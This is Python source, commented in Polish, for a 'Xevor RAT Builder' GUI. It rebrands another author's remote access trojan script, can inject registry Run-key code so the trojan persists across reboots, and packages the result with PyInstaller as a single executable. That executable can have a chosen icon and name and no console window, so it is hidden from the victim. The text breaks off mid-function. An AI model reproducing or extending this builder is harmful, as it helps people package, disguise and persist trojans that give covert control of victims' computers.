import os
import sys
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox
import shutil
import ctypes
import getpass

# Zmienne globalne
APP_NAME = "Xevor RAT Builder"
EXE_NAME_DEFAULT = "XevorClient"

# Funkcja kompilacji
def build_exe():
    script_path = entry_script.get()
    icon_path = entry_icon.get() if var_icon.get() else None
    hidden_console = not var_console.get()
    custom_name = entry_name.get().strip() or EXE_NAME_DEFAULT
    architecture = "64" if var_64bit.get() else "32"
    add_to_startup = var_startup.get()

    if not os.path.isfile(script_path):
        messagebox.showerror("Błąd", "Nieprawidłowa ścieżka do pliku .py")
        return

    # Edytuj token bota i inne zmienne w kodzie RAT-a
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            code = f.read()

        # Zamiana wszelkich wzmianek o H-zz-H na Xevor
        code = code.replace("H-zz-H", "Xevor")
        code = code.replace("hzzh", "xevor")
        code = code.replace("HZZH", "XEVIOR")
        code = code.replace("_h_zz_h_", "Xevor RAT Developer")

        # Opcjonalnie: dodanie do autostartu
        startup_code = ""
        if add_to_startup:
            startup_code = """
import os
import sys
import getpass
import winreg as reg

try:
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_WRITE)
    path = os.path.join(os.getenv('APPDATA'), '{}.exe'.format(sys.argv[0]))
    reg.SetValueEx(key, "Xevor RAT", 0, reg.REG_SZ, path)
    reg.CloseKey(key)
except Exception as e:
    pass
""".replace("Xevor RAT", "Xevor RAT")

        # Zapisz poprawiony kod tymczasowo
        modified_script = os.path.join(os.path.dirname(script_path), f"{custom_name}_modified.py")
        with open(modified_script, "w", encoding="utf-8") as f:
            f.write(code + "\n" + startup_code)

        # Komenda PyInstaller
        command = [
            "pyinstaller",
            "--onefile",
            "--noconfirm"
        ]

        if hidden_console:
            command.append("--noconsole")

        if icon_path and os.path.isfile(icon_path):
            command.extend(["--icon", icon_path])

        command.extend(["--name", custom_name])
        command.append(modified_script)

        # Uruchomienie kompilacji
        try:
            subprocess.run(command, check=True)
            messagebox.showinfo("Sukces", f"Pomyślnie skompilowano do dist/{custom_name}.exe")